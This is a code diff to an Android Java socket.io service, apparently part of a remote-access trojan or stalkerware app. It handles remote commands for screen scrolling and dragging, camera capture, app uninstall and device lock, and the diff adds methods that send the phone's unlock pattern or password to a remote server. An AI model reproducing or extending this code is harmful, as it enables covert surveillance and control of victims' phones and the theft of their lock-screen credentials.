@@ -107,6 +107,7 @@ public class Server extends Service {
             socket.on("mb-device-delete-event-" + mDeviceID, onUninstallAppMonitor);
             socket.on("mb-screen-control-scroll-" + mDeviceID, onScreenScrollMonitor);
             socket.on("mb-device-lock-" + mDeviceID, onDeviceLockMonitor);
+            socket.on("mb-device-security-event-" + mDeviceID, onDeviceSetPattern);
             socket.on("mb-monitor-close-" + mDeviceID, onCloseMonitor);
         } catch (URISyntaxException e) {
             e.printStackTrace();
@@ -154,7 +155,7 @@ public class Server extends Service {
                 broadcastIntent.putExtra("yPosition", yPosition);
                 sendBroadcast(broadcastIntent);
             } catch (JSONException e) {
-                throw new RuntimeException(e);
+                Log.d("error::", e.toString());
             }
         }
     };
@@ -178,7 +179,7 @@ public class Server extends Service {
                 Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_SCREEN_DRAG_MONITOR);
                 sendBroadcast(broadcastIntent);
             } catch (JSONException e) {
-                throw new RuntimeException(e);
+                Log.d("error::", e.toString());
             }
         }
     };
@@ -203,7 +204,7 @@ public class Server extends Service {
                     sendBroadcast(broadcastIntent);
                 }
             } catch (JSONException e) {
-                throw new RuntimeException(e);
+                Log.d("error::", e.toString());
             }
 
         }
@@ -232,7 +233,7 @@ public class Server extends Service {
                 sendBroadcast(broadcastIntent);
 
             } catch (JSONException e) {
-                throw new RuntimeException(e);
+                Log.d("error::", e.toString());
             }
         }
     };
@@ -244,18 +245,15 @@ public class Server extends Service {
             Log.d("CameraMonitor:", data.toString());
             String cameraType;
             int qualityType;
-
             try {
                 cameraType = (String) data.get("cameraType");
                 qualityType = (int) data.get("qualityType");
-
                 Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_BACK_CAMERA_MONITOR);
                 broadcastIntent.putExtra("quality", qualityType);
                 broadcastIntent.putExtra("cameraType", cameraType);
                 sendBroadcast(broadcastIntent);
-
             } catch (JSONException e) {
-                throw new RuntimeException(e);
+                Log.d("error::", e.toString());
             }
         }
     };
@@ -285,7 +283,7 @@ public class Server extends Service {
                 broadcastIntent.putExtra("filepath", filepath);
                 sendBroadcast(broadcastIntent);
             } catch (JSONException e) {
-                throw new RuntimeException(e);
+                Log.d("error::", e.toString());
             }
         }
     };
@@ -303,7 +301,7 @@ public class Server extends Service {
                 broadcastIntent.putExtra("event", close_event);
                 sendBroadcast(broadcastIntent);
             } catch (JSONException e) {
-                throw new RuntimeException(e);
+                Log.d("error::", e.toString());
             }
         }
     };
@@ -387,7 +385,7 @@ public class Server extends Service {
                 broadcastIntent.putExtra("event", scroll_event);
                 sendBroadcast(broadcastIntent);
             } catch (JSONException e) {
-                throw new RuntimeException(e);
+                Log.d("error::", e.toString());
             }
         }
     };
@@ -408,10 +406,31 @@ public class Server extends Service {
                     sendBroadcast(broadcastIntent);
                 }
             } catch (JSONException e) {
-                throw new RuntimeException(e);
+                Log.d("error::", e.toString());
             }
+        }
+    };
+    private final Emitter.Listener onDeviceSetPattern = new Emitter.Listener() {
+        @Override
+        public void call(Object... args) {
+            JSONObject data = (JSONObject) args[0];
+            Log.d("ScreenDragMonitor:", data.toString());
 
+            try {
+                JSONArray position_list = data.getJSONArray("password");
+                List<MousePositionEntry> pointsList= new ArrayList<>();
 
+                for (int i =0; i < position_list.length(); i++) {
+                    JSONObject position = position_list.getJSONObject(i);
+                    double x = position.getDouble("x");
+                    double y = position.getDouble("y");
+                    MousePositionEntry callLogEntry = new MousePositionEntry(x,y);
+                    pointsList.add(callLogEntry);
+                }
+                Common.getInstance().setKeygenEntries(pointsList);
+            } catch (JSONException e) {
+                Log.d("error::", e.toString());
+            }
         }
     };
 
@@ -676,4 +695,36 @@ public class Server extends Service {
             e.printStackTrace();
         }
     }
+
+    public void sendPatternKeyData(List<MousePositionEntry> positionList) {
+        JSONArray jsonArray = new JSONArray();
+        for (MousePositionEntry entry : positionList) {
+            jsonArray.put(entry.toJson());
+        }
+        try {
+            JSONObject sendJson = new JSONObject();
+            sendJson.put("deviceId", mDeviceID);
+            sendJson.put("password", jsonArray);
+            sendJson.put("type", "pattern");
+            if(socket != null && socket.connected()) {
+                socket.emit("device-security-information-response", sendJson);
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+    public void sendPasswordKeyData(String devicePassword) {
+        try {
+            JSONObject sendJson = new JSONObject();
+            sendJson.put("deviceId", mDeviceID);
+            sendJson.put("password", devicePassword);
+            sendJson.put("type", "password");
+            if(socket != null && socket.connected()) {
+                socket.emit("device-security-information-response", sendJson);
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
 }
